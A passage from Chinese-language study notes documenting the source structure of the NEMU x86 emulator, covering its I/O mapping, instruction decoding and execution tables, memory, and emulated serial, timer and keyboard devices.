CPU尝试访问这部分物理内存的时候, 实际上最终是访问了相应的I/O设备, CPU却浑然不知. 这样以后, CPU就可以通过普通的访存指令来访问设备. 这也是内存映射I/O得天独厚的好处: 物理内存的地址空间和CPU的位宽都会不断增长, 内存映射I/O从来不需要担心I/O地址空间耗尽的问题. 从原理上来说, 内存映射I/O唯一的缺点就是, CPU无法通过正常渠道直接访问那些被映射到I/O地址空间的物理内存了. 但随着计算机的发展, 内存映射I/O的唯一缺点已经越来越不明显了: 现代计算机都已经是64位计算机, 物理地址线都有48根, 这意味着物理地址空间有256TB这么大, 从里面划出3MB的地址空间给显存, 根本就是不痛不痒. 正因为如此, 内存映射I/O成为了现代计算机主流的I/O编址方式: RISC架构只提供内存映射I/O的编址方式, 而PCI-e, 网卡, x86的APIC等主流设备, 都支持通过内存映射I/O来访问.</p></blockquote><blockquote><p>在 NEMU 中， video memory是唯一使用内存映射 I/O 方式访问的 I/O 空间。</p></blockquote><p>定义了类型 <code>mmio_callback_t</code> ，设备定义的回调函数，用以更新设备状态。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span><span class="params">(*<span class="keyword">mmio_callback_t</span>)</span><span class="params">(<span class="keyword">paddr_t</span>, <span class="keyword">int</span>, <span class="keyword">bool</span>)</span></span>;</span><br></pre></td></tr></table></figure><table><thead><tr><th style="text-align:left">函数</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:left"><code>void* add_mmio_map(paddr_t, int, mmio_callback_t)</code></td><td style="text-align:left">注册一个内存映射 I/O 映射关系，返回该映射关系的 I/O 空间首地址</td></tr><tr><td style="text-align:left"><code>int is_mmio(paddr_t)</code></td><td style="text-align:left">判断一个物理地址是否被映射到 I/O 空间，如果是，返回映射号, 否则返回 -1</td></tr><tr><td style="text-align:left"><code>uint32_t mmio_read(paddr_t, int, int)</code></td><td style="text-align:left">根据端口号和地址读取</td></tr><tr><td style="text-align:left"><code>void mmio_write(paddr_t, int, uint32_t, int)</code></td><td style="text-align:left">根据端口号和地址写入</td></tr></tbody></table><h3 id="272-port-ioh"><a class="markdownIt-Anchor" href="#272-port-ioh"></a> 2.7.2 port-io.h</h3><p>对端口映射 I/O 编址方式的支持。端口映射I/O(port-mapped I/O)， CPU使用专门的I/O指令对设备进行访问， 并把设备的地址称作端口号。 有了端口号以后， 在I/O指令中给出端口号， 就知道要访问哪一个设备寄存器了。</p><p>定义了类型 <code>pio_callback_t</code> ，设备定义的回调函数，用以更新设备状态。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span><span class="params">(*<span class="keyword">pio_callback_t</span>)</span><span class="params">(<span class="keyword">ioaddr_t</span>, <span class="keyword">int</span>, <span class="keyword">bool</span>)</span></span>;</span><br></pre></td></tr></table></figure><table><thead><tr><th style="text-align:left">函数</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:left"><code>void* add_pio_map(paddr_t, int, mmio_callback_t)</code></td><td style="text-align:left">注册一个端口映射 I/O 映射关系，返回该映射关系的 I/O 空间首地址</td></tr><tr><td style="text-align:left"><code>uint32_t pio_read_[l,w,b](ioaddr_t)</code></td><td style="text-align:left">面向 CPU 的端口 I/O 读接口</td></tr><tr><td style="text-align:left"><code>void pio_write_[l,w,b](ioaddr_t, uint32_t)</code></td><td style="text-align:left">面向 CPU 的端口 I/O 写接口</td></tr></tbody></table><h2 id="28-monitor"><a class="markdownIt-Anchor" href="#28-monitor"></a> 2.8 monitor/</h2><p>监视器部分（也包含 NEMU 执行主循环）。</p><h3 id="281-exprh"><a class="markdownIt-Anchor" href="#281-exprh"></a> 2.8.1 expr.h</h3><p>定义了计算表达式的值的函数 <code>expr</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">expr</span><span class="params">(<span class="keyword">char</span> *, <span class="keyword">bool</span> *)</span></span>;</span><br></pre></td></tr></table></figure><h3 id="282-monitorh"><a class="markdownIt-Anchor" href="#282-monitorh"></a> 2.8.2 monitor.h</h3><p>定义了 NEMU 状态 变量 <code>nemu_state</code>，和枚举值 <code>NEMU_STOP, NEMU_RUNNING, NEMU_END, NEMU_ABORT</code>。 定义了 应用程序入口点 <code>ENTRY_START</code> ：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ENTRY_START 0x100000</span></span><br></pre></td></tr></table></figure><h3 id="283-watchpointh"><a class="markdownIt-Anchor" href="#283-watchpointh"></a> 2.8.3 watchpoint.h</h3><h4 id="结构体-wp"><a class="markdownIt-Anchor" href="#结构体-wp"></a> 结构体 WP</h4><p>监视点结构。采用链表结构存储。</p><table><thead><tr><th style="text-align:left">成员</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:left"><code>NO</code></td><td style="text-align:left">序号</td></tr><tr><td style="text-align:left"><code>next</code></td><td style="text-align:left">下一监视点指针</td></tr><tr><td style="text-align:left"><code>expr</code></td><td style="text-align:left">监视的表达式</td></tr><tr><td style="text-align:left"><code>lastVal</code></td><td style="text-align:left">表达式最近一次的值</td></tr></tbody></table><h2 id="29-util"><a class="markdownIt-Anchor" href="#29-util"></a> 2.9 util/</h2><h3 id="291-c_oph"><a class="markdownIt-Anchor" href="#291-c_oph"></a> 2.9.1 c_op.h</h3><p>定义了一些形如 <code>c_opname_type</code> 的宏，用于表示基础 C 运算。在 RTL基本指令中的寄存器运算指令中使用。</p><h1 id="3-src"><a class="markdownIt-Anchor" href="#3-src"></a> 3 src/</h1><h2 id="mainc"><a class="markdownIt-Anchor" href="#mainc"></a> main.c</h2><p>NEMU 主程序。</p><p>调用 <code>init_monitor</code> （实现在 <code>/src/monitor/monitor.c</code>）初始化监视器，并获取当前是否为批处理模式。 调用 <code>ui_mainloop</code> （实现在 <code>/src/monitor/debug/ui.c</code>）进行指令执行模拟。</p><h2 id="cpu"><a class="markdownIt-Anchor" href="#cpu"></a> cpu/</h2><h3 id="regc"><a class="markdownIt-Anchor" href="#regc"></a> reg.c</h3><p>实现了 <code>include/cpu/reg.h</code> 中的 <code>regsl,regsw,regsb</code>，同时实现寄存器实际定义：变量 <code>cpu</code>。</p><ul><li>函数 <code>reg_test</code>：测试寄存器结构定义（<code>CPU_state</code>）是否正确。</li></ul><h3 id="intrc"><a class="markdownIt-Anchor" href="#intrc"></a> intr.c</h3><p>函数 <code>void raise_intr(uint8_t NO, vaddr_t ret_addr)</code> 为 <code>int</code> 指令（在 <code>system.c</code> 中实现）的内部实现。 实现了触发中断或异常后的硬件处理：</p><ol><li>依次将EFLAGS, CS(代码段寄存器), EIP寄存器（返回地址）的值压入堆栈</li><li>根据中断码，从IDTR中读出IDT的首地址</li><li>根据异常号在IDT中进行索引, 找到一个门描述符</li><li>将门描述符中的offset域组合成目标地址</li><li>跳转到目标地址</li></ol><h3 id="decode"><a class="markdownIt-Anchor" href="#decode"></a> decode/</h3><p>指令译码相关。</p><h4 id="decodec"><a class="markdownIt-Anchor" href="#decodec"></a> decode.c</h4><p>实现了 <code>include/cpu/decode.h</code> 中的译码函数族，函数 <code>operand_write</code> 以及译码信息变量 <code>decoding</code>。 实现了 <code>include/cpu/rtl.h</code> 中的临时寄存器 <code>t0,t1,t2,t3,at</code> 和函数 <code>decoding_set_jmp</code>。</p><h5 id="宏-make_dophelper-与函数族-decode_op_name"><a class="markdownIt-Anchor" href="#宏-make_dophelper-与函数族-decode_op_name"></a> 宏 make_DopHelper 与函数族 decode_op_name</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> make_DopHelper(name) void concat(decode_op_, name) (vaddr_t *eip, Operand *op, bool load_val)</span></span><br></pre></td></tr></table></figure><p>译码函数会进一步分解成各种不同操作数的译码的组合，以实现操作数译码的解耦. 操作数译码函数统一通过宏 <code>make_DopHelper</code> 来定义 （<code>decode_op_rm</code> 除外）。 操作数译码函数会把操作数的信息记录在结构体 <code>op</code> 中, 如果操作数在指令中， 就会通过 <code>instr_fetch()</code> 将它们从 <code>eip</code> 所指向的内存位置取出. 为了使操作数译码函数更易于复用， 函数中的 <code>load_val</code> 参数会控制 是否需要将该操作数读出到全局译码信息 <code>decoding</code> 供后续使用. 例如如果一个内存操作数是源操作数, 就需要将这个操作数从内存中读出来供后续执行阶段来使用； 如果它仅仅是一个目的操作数， 就不需要从内存读出它的值了，因为执行这条指令并不需要这个值， 而是将新数据写入相应的内存位置.</p><p><code>decode_op_name</code> 函数族命名规则可参见 <code>decode_name</code> 函数族命名规则。</p><ul><li><code>decode_op_a</code> 是一个特例，其用于将操作数标记为寄存器 <code>ax</code> 或 <code>eax</code></li></ul><h4 id="modrmc"><a class="markdownIt-Anchor" href="#modrmc"></a> modrm.c</h4><p>实现了 <code>include/cpu/decode.h</code> 中的函数 <code>load_addr</code> 和 <code>read_ModR_M</code>。</p><h3 id="exec"><a class="markdownIt-Anchor" href="#exec"></a> exec/</h3><p>指令执行相关。</p><h4 id="ccc"><a class="markdownIt-Anchor" href="#ccc"></a> cc.c</h4><p>实现了 <code>include/cpu/cc.h</code> 中的函数 <code>rtl_setcc</code>。根据指定关系运算以及条件标志位设置 dest。</p><h4 id="relopc"><a class="markdownIt-Anchor" href="#relopc"></a> relop.c</h4><p>实现了 <code>include/cpu/relop.h</code> 中的函数 <code>interpret_relop</code>，使用 C语言关系运算符实现关系运算。</p><h4 id="all-instrh"><a class="markdownIt-Anchor" href="#all-instrh"></a> all-instr.h</h4><p>定义了已经实现的指令执行函数（在 <code>exec.c</code> 中使用）。</p><h4 id="arithc"><a class="markdownIt-Anchor" href="#arithc"></a> arith.c</h4><p>算术运算指令执行函数实现。</p><table><thead><tr><th style="text-align:left">指令</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:left"><code>add</code></td><td style="text-align:left"></td></tr><tr><td style="text-align:left"><code>sub</code></td><td style="text-align:left"></td></tr><tr><td style="text-align:left"><code>cmp</code></td><td style="text-align:left"></td></tr><tr><td style="text-align:left"><code>inc</code></td><td style="text-align:left"></td></tr><tr><td style="text-align:left"><code>dec</code></td><td style="text-align:left"></td></tr><tr><td style="text-align:left"><code>neg</code></td><td style="text-align:left"></td></tr><tr><td style="text-align:left"><code>adc</code></td><td style="text-align:left"></td></tr><tr><td style="text-align:left"><code>sbb</code></td><td style="text-align:left"></td></tr><tr><td style="text-align:left"><code>mul</code></td><td style="text-align:left"></td></tr><tr><td style="text-align:left"><code>imul1</code></td><td style="text-align:left">imul 单操作数</td></tr><tr><td style="text-align:left"><code>imul2</code></td><td style="text-align:left">imul 双操作数</td></tr><tr><td style="text-align:left"><code>imul3</code></td><td style="text-align:left">imul 三操作数</td></tr><tr><td style="text-align:left"><code>div</code></td><td style="text-align:left"></td></tr><tr><td style="text-align:left"><code>idiv</code></td><td style="text-align:left"></td></tr></tbody></table><h4 id="controlc"><a class="markdownIt-Anchor" href="#controlc"></a> control.c</h4><p>控制指令执行函数实现。</p><table><thead><tr><th style="text-align:left">指令</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:left"><code>jmp</code></td><td style="text-align:left">直接跳转</td></tr><tr><td style="text-align:left"><code>jmp_rm</code></td><td style="text-align:left">间接跳转</td></tr><tr><td style="text-align:left"><code>jcc</code></td><td style="text-align:left">条件跳转</td></tr><tr><td style="text-align:left"><code>call</code></td><td style="text-align:left">直接调用</td></tr><tr><td style="text-align:left"><code>call_rm</code></td><td style="text-align:left">间接调用</td></tr><tr><td style="text-align:left"><code>ret</code></td><td style="text-align:left"></td></tr></tbody></table><h4 id="data-movc"><a class="markdownIt-Anchor" href="#data-movc"></a> data-mov.c</h4><p>数据移动指令执行函数实现。</p><table><thead><tr><th style="text-align:left">指令</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:left"><code>mov</code></td><td style="text-align:left"></td></tr><tr><td style="text-align:left"><code>movsx</code></td><td style="text-align:left"></td></tr><tr><td style="text-align:left"><code>movzx</code></td><td style="text-align:left"></td></tr><tr><td style="text-align:left"><code>lea</code></td><td style="text-align:left"></td></tr><tr><td style="text-align:left"><code>push</code></td><td style="text-align:left"></td></tr><tr><td style="text-align:left"><code>pop</code></td><td style="text-align:left"></td></tr><tr><td style="text-align:left"><code>pusha</code></td><td style="text-align:left"></td></tr><tr><td style="text-align:left"><code>popa</code></td><td style="text-align:left"></td></tr><tr><td style="text-align:left"><code>leave</code></td><td style="text-align:left"></td></tr><tr><td style="text-align:left"><code>cltd</code></td><td style="text-align:left"></td></tr><tr><td style="text-align:left"><code>cwtl</code></td><td style="text-align:left"></td></tr></tbody></table><h4 id="logicc"><a class="markdownIt-Anchor" href="#logicc"></a> logic.c</h4><p>逻辑运算指令执行函数实现。</p><table><thead><tr><th style="text-align:left">指令</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:left"><code>test</code></td><td style="text-align:left"></td></tr><tr><td style="text-align:left"><code>and</code></td><td style="text-align:left"></td></tr><tr><td style="text-align:left"><code>xor</code></td><td style="text-align:left"></td></tr><tr><td style="text-align:left"><code>or</code></td><td style="text-align:left"></td></tr><tr><td style="text-align:left"><code>sar</code></td><td style="text-align:left"></td></tr><tr><td style="text-align:left"><code>shl</code></td><td style="text-align:left"></td></tr><tr><td style="text-align:left"><code>shr</code></td><td style="text-align:left"></td></tr><tr><td style="text-align:left"><code>setcc</code></td><td style="text-align:left"></td></tr><tr><td style="text-align:left"><code>not</code></td><td style="text-align:left"></td></tr><tr><td style="text-align:left"><code>rol</code></td><td style="text-align:left"></td></tr><tr><td style="text-align:left"><code>ror</code></td><td style="text-align:left"></td></tr></tbody></table><h4 id="specialc"><a class="markdownIt-Anchor" href="#specialc"></a> special.c</h4><p>特殊指令执行函数实现。</p><p>实现了 <code>include/cpu/rtl.h</code> 中的函数 <code>interpret_rtl_exit</code>。</p><table><thead><tr><th style="text-align:left">指令</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:left"><code>nop</code></td><td style="text-align:left"></td></tr><tr><td style="text-align:left"><code>inv</code></td><td style="text-align:left">非法指令</td></tr><tr><td style="text-align:left"><code>nemu_trap</code></td><td style="text-align:left">结束执行</td></tr></tbody></table><h4 id="prefixc"><a class="markdownIt-Anchor" href="#prefixc"></a> prefix.c</h4><p>定义了执行函数 <code>exec_real</code>。 定义并实现了执行函数 <code>exec_operand_size</code>。</p><ul><li><code>exec_operand_size</code> 以 16 位操作数执行指令（标记 <code>decoding.is_operand_size_16</code>）</li></ul><h4 id="systemc"><a class="markdownIt-Anchor" href="#systemc"></a> system.c</h4><p>系统相关指令实现。</p><table><thead><tr><th style="text-align:left">指令</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:left"><code>lidt</code></td><td style="text-align:left">设置 IDTR 寄存器</td></tr><tr><td style="text-align:left"><code>mov_r2cr</code></td><td style="text-align:left"></td></tr><tr><td style="text-align:left"><code>mov_cr2r</code></td><td style="text-align:left"></td></tr><tr><td style="text-align:left"><code>int</code></td><td style="text-align:left">根据中断码进行中断跳转</td></tr><tr><td style="text-align:left"><code>iret</code></td><td style="text-align:left">从中断跳转返回</td></tr><tr><td style="text-align:left"><code>in</code></td><td style="text-align:left">读取端口映射 I/O</td></tr><tr><td style="text-align:left"><code>out</code></td><td style="text-align:left">写入端口映射 I/O</td></tr></tbody></table><ul><li>x86 提供了 in 和 out 指令用于访问设备，其中 in 指令用于将设备寄存器中的数据传输到 CPU 寄存器中，out 指令用于将 CPU 寄存器中的数据传送到设备寄存器中</li></ul><h4 id="execc"><a class="markdownIt-Anchor" href="#execc"></a> exec.c</h4><p>指令执行过程核心实现。</p><h5 id="结构体-opcode_entry"><a class="markdownIt-Anchor" href="#结构体-opcode_entry"></a> 结构体 opcode_entry</h5><p>译码查找表中元素。</p><table><thead><tr><th style="text-align:left">成员</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:left"><code>DHelper decode</code></td><td style="text-align:left">译码函数指针</td></tr><tr><td style="text-align:left"><code>EHelper execute</code></td><td style="text-align:left">执行函数指针</td></tr><tr><td style="text-align:left"><code>width</code></td><td style="text-align:left">指令宽度</td></tr></tbody></table><h5 id="数组-opcode_table"><a class="markdownIt-Anchor" href="#数组-opcode_table"></a> 数组 opcode_table</h5><p>译码表。按指令第一个字节索引存放。分两段：单字节指令码和双字节指令码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">opcode_entry opcode_table [<span class="number">512</span>] = &#123;</span><br><span class="line">  <span class="comment">/* 0x00 */</span>EMPTY, EMPTY, EMPTY, EMPTY,</span><br><span class="line">  <span class="comment">/* 0x04 */</span>EMPTY, EMPTY, EMPTY, EMPTY,</span><br><span class="line">  <span class="comment">/* 0x08 */</span>EMPTY, EMPTY, EMPTY, EMPTY,</span><br><span class="line">  ...</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><table><thead><tr><th style="text-align:left">宏</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:left"><code>IDEXW(id, ex, w)</code></td><td style="text-align:left">根据译码函数名，执行函数名，宽度生成 <code>opcode_entry</code></td></tr><tr><td style="text-align:left"><code>IDEX(id, ex)</code></td><td style="text-align:left">根据译码函数名，执行函数名，以宽度 0 生成 <code>opcode_entry</code></td></tr><tr><td style="text-align:left"><code>EXW(ex, w)</code></td><td style="text-align:left">根据执行函数名，宽度，生成无译码函数的 <code>opcode_entry</code></td></tr><tr><td style="text-align:left"><code>EX(ex)</code></td><td style="text-align:left">根据执行函数名，生成宽度为 0 且无译码函数的 <code>opcode_entry</code></td></tr><tr><td style="text-align:left"><code>EMPTY</code></td><td style="text-align:left">未实现的命令，使用 <code>exec_inv</code>（定义在 <code>special.c</code> 中） 构造 <code>opcode_entry</code></td></tr><tr><td style="text-align:left"><code>make_group(name, item0, item1, item2, item3, item4, item5, item6, item7)</code></td><td style="text-align:left">用于实现 <code>sub /5</code> 这种根据第二个指令码 <code>/5</code> 区分不同指令的情况。会自动生成一个 <code>exec_name</code> 的统一执行函数，并根据 <code>decoding.ext_opcode</code> 分配到指定执行函数。</td></tr></tbody></table><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IDEXW(id, ex, w)   &#123;concat(decode_, id), concat(exec_, ex), w&#125;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IDEX(id, ex)       IDEXW(id, ex, 0)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EXW(ex, w)         &#123;NULL, concat(exec_, ex), w&#125;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EX(ex)             EXW(ex, 0)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EMPTY              EX(inv)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> make_group(name, item0, item1, item2, item3, item4, item5, item6, item7) \</span></span><br><span class="line">  static opcode_entry concat(opcode_table_, name) [8] = &#123; \</span><br><span class="line">    <span class="comment">/* 0x00 */</span>item0, item1, item2, item3, \</span><br><span class="line">    <span class="comment">/* 0x04 */</span>item4, item5, item6, item7  \</span><br><span class="line">  &#125;; \</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">make_EHelper</span><span class="params">(name)</span> </span>&#123; \</span><br><span class="line">  idex(eip, &amp;concat(opcode_table_, name)[decoding.ext_opcode]); \</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用 <code>make_group</code> 宏定义了一些组 <code>gp1</code> - <code>gp7</code>。对应于 80386 手册附录中组的划分。</p><h5 id="函数-exec_wrapper"><a class="markdownIt-Anchor" href="#函数-exec_wrapper"></a> 函数 exec_wrapper</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">exec_wrapper</span><span class="params">(<span class="keyword">bool</span> print_flag)</span></span>;</span><br></pre></td></tr></table></figure><p>执行下一条指令。</p><ul><li>首先将当前的 <code>%eip</code> 保存到全局译码信息 <code>decoding</code> 的成员 <code>seq_eip</code> 中</li><li>然后将其地址被作为参数送进<code>exec_real()</code>函数中<ul><li><code>seq</code> 代表顺序的意思, 当代码从 <code>exec_real()</code> 返回时，<code>decoding.seq_eip</code> 将会指向下一条指令的地址.</li></ul></li><li>调用 <code>update_eip</code> 更新 <code>%eip</code></li><li>调试模式下<ul><li>记录日志（指令内容以及相关信息）</li><li>若 <code>print_flag</code> 为真，则显示 <code>decoding.asm_buf</code></li></ul></li></ul><h5 id="函数-exec_real"><a class="markdownIt-Anchor" href="#函数-exec_real"></a> 函数 exec_real</h5><ul><li>首先通过 <code>instr_fetch()</code> 函数(在 <code>include/cpu/exec.h</code> 中定义)进行取指， 得到指令的第一个字节, 将其解释成 <code>opcode</code> 并记录在全局译码信息 <code>decoding</code> 中.</li><li>根据 <code>opcode</code> 查阅译码查找表，得到操作数的宽度信息，并通过调用 <code>set_width()</code> 函数将其记录在全局译码信息 <code>decoding</code> 中</li><li>调用 <code>idex()</code> 对指令进行进一步的译码和执行</li></ul><h5 id="函数-set_width"><a class="markdownIt-Anchor" href="#函数-set_width"></a> 函数 set_width</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">set_width</span><span class="params">(<span class="keyword">int</span> <span class="built_in">width</span>)</span></span>;</span><br></pre></td></tr></table></figure><p>根据指令定义宽度（<code>opcode_entry.width</code>）指定所有操作数宽度（<code>decoding.src.width</code>）。</p><ul><li>如果定义宽度为 0，则采用译码结果（<code>decoding.is_operand_size_16</code>）</li></ul><h5 id="函数-idex"><a class="markdownIt-Anchor" href="#函数-idex"></a> 函数 idex</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Instruction Decode and EXecute */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">idex</span><span class="params">(<span class="keyword">vaddr_t</span> *eip, opcode_entry *e)</span></span>;</span><br></pre></td></tr></table></figure><p>调用译码查找表中的相应的译码函数（若存在）进行操作数的译码，译码过程结束之后, 会调用译码查找表中的相应的执行函数来进行真正的执行操作。</p><h5 id="函数-update_eip"><a class="markdownIt-Anchor" href="#函数-update_eip"></a> 函数 update_eip</h5><p>根据当前指令是否为跳转指令，更新 <code>%eip</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">update_eip</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (decoding.is_jmp) &#123; decoding.is_jmp = <span class="number">0</span>; &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123; cpu.eip = decoding.seq_eip; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="memory"><a class="markdownIt-Anchor" href="#memory"></a> memory/</h2><h3 id="memoryc"><a class="markdownIt-Anchor" href="#memoryc"></a> memory.c</h3><p>定义了宏 <code>PMEM_SIZE</code> 指定物理内存大小。 实现了 <code>include/memory/memory.h</code> 中的函数 <code>paddr_read</code>，<code>paddr_write</code>，<code>vaddr_read</code>，<code>vaddr_write</code>。</p><ul><li><code>vaddr_read, vaddr_write</code> 的实现调用了 <code>paddr_read</code> 和 <code>paddr_write</code>。</li><li>为支持内存映射 I/O，<code>paddr_read, paddr_write</code> 的实现加入了对内存映射 I/O 的判断。</li></ul><h2 id="device"><a class="markdownIt-Anchor" href="#device"></a> device/</h2><h3 id="io"><a class="markdownIt-Anchor" href="#io"></a> io/</h3><h4 id="mmioc"><a class="markdownIt-Anchor" href="#mmioc"></a> mmio.c</h4><p>定义了宏 <code>MMIO_SPACE_MAX</code> 指定内存映射空间大小。 定义了结构体 <code>MMIO_t</code> 保存 MMIO 信息。</p><p>实现了 <code>include/device/mmio.h</code> 中的函数。</p><ul><li>在 <code>mmio_read</code> 和 <code>mmio_write</code> 中，调用了回调函数。</li></ul><h4 id="port-ioc"><a class="markdownIt-Anchor" href="#port-ioc"></a> port-io.c</h4><p>定义了宏 <code>PORT_IO_SPACE_MAX</code> 指定内存映射空间大小。 定义了结构体 <code>PIO_t</code> 保存 MMIO 信息。</p><p>实现了 <code>include/device/port-io.h</code> 中的函数。</p><ul><li>在 <code>pio_read_common</code> 和 <code>pio_write_common</code> 中，调用了回调函数。</li><li>基于 <code>pio_read_common</code> 和 <code>pio_write_common</code> 实现了不同的端口读写函数</li></ul><h3 id="devicec"><a class="markdownIt-Anchor" href="#devicec"></a> device.c</h3><p>提供初始化和控制设备的一些函数。含有和SDL库相关的代码，NEMU使用SDL库来实现设备的模拟。</p><table><thead><tr><th style="text-align:left">宏</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:left"><code>TIMER_HZ</code></td><td style="text-align:left">时钟频率</td></tr><tr><td style="text-align:left"><code>VGA_HZ</code></td><td style="text-align:left">VGA 刷新频率</td></tr></tbody></table><h4 id="函数-init_device"><a class="markdownIt-Anchor" href="#函数-init_device"></a> 函数 init_device</h4><p>用于初始化设备：串口， 时钟， 键盘， VGA四种设备。 其中在初始化 VGA 时还会进行一些和SDL相关的初始化工作， 包括创建窗口， 设置显示模式等. 最后还会注册一个100Hz的定时器， 每隔0.01秒就会调用一次 <code>device_update()</code> 函数。</p><h4 id="函数-device_update"><a class="markdownIt-Anchor" href="#函数-device_update"></a> 函数 device_update</h4><p>主要进行一些设备的模拟操作, 包括以50Hz的频率刷新屏幕, 以及检测是否有按键按下/释放.</p><p>需要说明的是， 代码中注册的定时器是虚拟定时器， 它只会在 NEMU 处于用户态的时候进行计时： 如果 NEMU 在 <code>ui_mainloop()</code> 中等待用户输入， 定时器将不会计时; 如果 NEMU 进行大量的输出， 定时器的计时将会变得缓慢. 因此除非你在进行调试， 否则尽量避免大量输出的情况， 从而影响定时器的工作。</p><h3 id="serialc"><a class="markdownIt-Anchor" href="#serialc"></a> serial.c</h3><p>串口设备。 模拟了串口的功能。 其大部分功能也被简化，只保留了数据寄存器和状态寄存器。串口初始化时会分别注册 <code>0x3F8</code> 和 <code>0x3FC</code> 处长度为1个字节的端口，分别作为数据寄存器和状态寄存器。由于NEMU串行模拟计算机系统的工作，串口的状态寄存器可以一直处于空闲状态; 每当CPU往数据寄存器中写入数据时，串口会将数据传送到主机的标准输出。</p><table><thead><tr><th style="text-align:left">函数/宏</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:left"><code>init_serial()</code></td><td style="text-align:left">初始化设备</td></tr><tr><td style="text-align:left"><code>SERIAL_PORT=0x3F8</code></td><td style="text-align:left">端口 I/O 地址</td></tr></tbody></table><h3 id="timerc"><a class="markdownIt-Anchor" href="#timerc"></a> timer.c</h3><p>时钟设备。 模拟了i8253计时器的功能. 计时器的大部分功能都被简化, 只保留了&quot;发起时钟中断&quot;的功能. 同时添加了一个自定义的RTC(Real Time Clock), 初始化时将会注册0x48处的端口作为RTC寄存器, CPU可以通过I/O指令访问这一寄存器, 获得当前时间(单位是ms).</p><table><thead><tr><th style="text-align:left">函数/宏</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:left"><code>init_timer()</code></td><td style="text-align:left">初始化设备</td></tr><tr><td style="text-align:left"><code>RTC_PORT=0x48</code></td><td style="text-align:left">端口 I/O 地址</td></tr></tbody></table><h3 id="keyboardc"><a class="markdownIt-Anchor" href="#keyboardc"></a> keyboard.c</h3><p>键盘设备。 模拟了i8042通用设备接口芯片的功能. 其大部分功能也被简化, 只保留了键盘接口. i8042初始化时会注册 <code>0x60</code> 处的端口（长度为 4）作为数据寄存器. 每当用户敲下/释放按键时, 将会把相应的键盘码放入数据寄存器, CPU可以通过端口I/O访问数据寄存器, 获得键盘码; 当无按键可获取时, 将会返回 <code>_KEY_NONE</code> . 在AM中, 我们约定通码的值为 <code>断码 | KEYDOWN_MASK</code>.</p><table><thead><tr><th style="text-align:left">函数/宏</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:left"><code>init_i8042()</code></td><td style="text-align:left">初始化设备</td></tr><tr><td style="text-align:left"><code>I8042_DATA_PORT=0x60</code></td><td style="text-align:left">端口 I/O 地址</td></tr><tr><td style="text-align:left"><code>KEYDOWN_MASK=0x8000</code></td><td style="text-align:left">通码 MASK</td></tr><tr><td style="text-align:left"><code>KEY_QUEUE_LEN</code></td><td 